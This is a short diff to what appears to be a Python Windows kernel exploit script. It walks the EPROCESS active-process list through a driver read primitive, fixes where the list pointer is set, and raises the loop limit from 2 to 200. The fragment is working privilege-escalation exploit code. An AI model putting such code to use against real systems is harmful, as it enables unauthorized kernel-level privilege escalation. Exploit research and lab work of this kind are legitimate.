@@ -310,9 +310,10 @@ def executeOverwrite():
         ptr_firstEPROCESS = readValueatAddress(driver, system_EPROCESS_struct_ptr+0x2e8, USER_ADDR_OFFSET)
         deref_ptr_firstEPROCESS = readValueatAddress(driver, ptr_firstEPROCESS, USER_ADDR_OFFSET)
         ptr_backEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+        flink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
         
         while True:
-            flink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+            
             print "Flink is: " + hex(flink)
             flinkEPROCESS = flink - ACTIVE_PROC_LINK_OFFSET
             print "FlinkEPROCESS (flink-2e8) is: " + hex(flinkEPROCESS)
@@ -332,9 +333,9 @@ def executeOverwrite():
             flink = nextflink
 
 
-            total_writes = total_writes + 1
+            total_writes += 1
 
-            if total_writes >2:
+            if total_writes >200:
                 break
         
 
